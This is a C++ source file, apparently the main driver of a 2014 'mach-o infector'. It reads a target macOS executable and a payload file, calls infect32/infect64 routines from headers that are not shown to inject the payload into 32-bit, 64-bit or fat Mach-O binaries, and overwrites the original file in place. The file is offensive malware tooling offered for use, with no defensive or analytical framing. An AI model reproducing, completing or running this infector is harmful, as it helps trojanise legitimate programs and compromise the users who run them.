//
//  main.cpp
//  mach-o infector
//
//  Created by Pest on 27.11.14.
//  Copyright (c) 2014 coru.ws. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "infect32.h"
#include "infect64.h"
#include "fat.h"
#include <mach/machine.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>

bool fload(char *fname,uint8 *&buf,uint32 &size){
    bool r=false;
    FILE *f=fopen(fname,"rb");
    if (f){
        fseek(f,0,SEEK_END);
        size=ftell(f);
        if (size>0){
            fseek(f,0,SEEK_SET);
            buf=(uint8*)malloc(size);
            if (buf){
                if (fread(buf,1,size,f)==size){
                    r=true;
                }else{
                    free(buf);
                }
            }
        }
        fclose(f);
    }
    return r;
}

bool fsave(char *fname,uint8 *buf,uint32 size){
    bool r=false;
    FILE *f=fopen(fname,"wb+");
    if (f){
        if (fwrite(buf,1,size,f)==size){
            r=true;
        }
        fclose(f);
    }
    return r;
}

bool infect_fat(uint8 *&buf,uint32 &size,uint8 *x32,uint32 lx32,uint8 *x64,uint32 lx64){
    uint8 *mod;
    uint32 lmod;
    uint32 n=0;
    if (get_arch_from_fat(buf,size,CPU_TYPE_X86,mod,lmod)){
        uint8 *p=(uint8*)malloc(lmod);
        if (!p)
            return false;
        memcpy(p,mod,lmod);
        if (infect32(p,lmod,x32,lx32)){
            if (update_arch_fat(buf,size,CPU_TYPE_X86,p,lmod))
                n++;
            
        }
        free(p);
    }

    if (get_arch_from_fat(buf,size,CPU_TYPE_X86_64,mod,lmod)){
        uint8 *p=(uint8*)malloc(lmod);
        if (!p)
            return false;
        memcpy(p,mod,lmod);
        if (infect64(p,lmod,x64,lx64)){
            if (update_arch_fat(buf,size,CPU_TYPE_X86_64,p,lmod))
                n++;
        }
        free(p);
    }
    if (!n)
        return false;
    
    return true;
}


bool infect_macho(uint8 *&buf,uint32 &size,uint8 *x32,uint32 lx32,uint8 *x64,uint32 lx64){
    if (size<4)
        return false;
    uint32 magic=*(uint32*)buf;
    if (magic==FAT_MAGIC || magic==FAT_CIGAM){
        return infect_fat(buf,size,x32,lx32,x64,lx64);
    }
    
    if (magic==MH_MAGIC)
        return infect32(buf,size,x32,lx32);

    if (magic==MH_MAGIC_64)
        return infect64(buf,size,x64,lx64);
    return false;
}


int main(int n,char **arg){
    
    if (n<3){
        printf("Invalid argument: %s <target> <payload>\n",arg[0]);
        return 0;
    }
    
    uint8 *file;
    uint32 lfile;
    
    if (fload((char*)arg[1],file,lfile)){
        uint8 *pl;
        uint32 lpl;
        if (fload(arg[2],pl,lpl)){
            if (infect_macho(file,lfile,pl,lpl,pl,lpl)){
                fsave(/*(char*)"a.out"*/(char*)arg[1],file,lfile);
                printf("Infected %s\n",arg[1]);
            }else{
                printf("I can't intected this file\n");
            }
            free(pl);
        }
        free(file);
    }
    return 0;
}
